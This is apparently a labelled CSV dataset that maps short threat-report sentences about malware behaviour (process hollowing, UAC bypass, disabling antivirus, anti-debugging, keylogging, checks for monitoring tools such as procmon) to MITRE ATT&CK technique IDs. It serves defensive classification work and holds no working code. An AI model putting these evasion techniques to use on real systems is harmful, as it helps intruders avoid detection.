text,label
can search for anti-virus products on the system.,T1518.001
has a command built in to use a raw TCP socket. ,T1095
UAC bypass implementation,T1548.002
leveraged Sysmon to understand the processes services in the organization.,T1057
has the ability to identify the user on a compromised host.,T1033
control flow obfuscation,T1027
can send collected data in JSON format to C2.,T1041
A  malware sample performs reflective DLL injection.(Citation: McAfee Lazarus Resurfaces Feb 2018),T1055
A Linux version of  checks if the victim user ID is anything other than zero (normally used for root) and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.,T1033
can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.,T1106
has a command to delete its Registry key and scheduled task.,T1070.004
During  the threat actors downloaded additional droppers and backdoors onto a compromised system. ,T1105
includes garbage code to mislead anti-malware software and researchers.(Citation: ESET OceanLotus),T1027
Registry Editor,T1112
"The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime",T1140
has a module for performing remote desktop access.,T1021.001
performed process hollowing through the API calls CreateRemoteThread ResumeThread and Wow64SetThreadContext.,T1055
"pc.dll decrypts,",T1140
Creates registry key for persistence only,T1547.001
is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.(Citation: Fidelis Turbo),T1070.004
has deployed tools after moving laterally using administrative accounts.,T1570
has the ability to overwrite scripts and delete itself if a sandbox environment is detected.,T1070.004
"The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.",T1027
has the ability to use the CreatePipe API to add a sub-process for execution via .,T1106
The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.,T1027
These work in tandem to insert data into the Windows Registry,T1112
has the ability to execute command line arguments on a compromised host.,T1059.003
can enumerate running processes.,T1057
Malware used by  is capable of capturing keystrokes.,T1056.001
has relied on a user to execute a malicious attachment delivered via spearphishing.,T1204.002
can search files on a compromised host.,T1083
has supported use of a proxy server.,T1090
has used malicious files including VBS LNK and HTML for execution.,T1204.002
uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).,T1218.011
downloaded additional payloads after a target was infected with a first-stage downloader.,T1105
A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.,T1078
has disabled antivirus services on targeted systems in order to upload malicious payloads.,T1562.001
"When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",T1105
has used malware that can capture screenshots of the victims machine.,T1113
"The data in the HTTP body is the same as the past variant,",T1071.001
searches for files that are 60mb and less and contain the following extensions: .doc .docx .xls .xlsx .ppt .pptx .exe .zip and .rar.  also runs the echo %APPDATA% command to list the contents of the directory.(Citation: Securelist Sofacy Feb 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy May 2019)  can obtain the current execution path as well as perform drive enumeration.(Citation: Accenture SNAKEMACKEREL Nov 2018) ,T1083
finds a specified directory lists the files and metadata about those files.,T1083
has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.,T1070.004
"The malware checks if there are monitoring tools, specifically Process Monitor, running in the current machine with the following strings:
procmon
procmon64
procmon64a",T1518.001
 AmmyAdmin,T1219
establishes a backdoor over HTTP.,T1071.001
The user account was possibly compromised on the Linux server by using credential stuffing,T1110
Disabling PowerShell logging,T1562.001
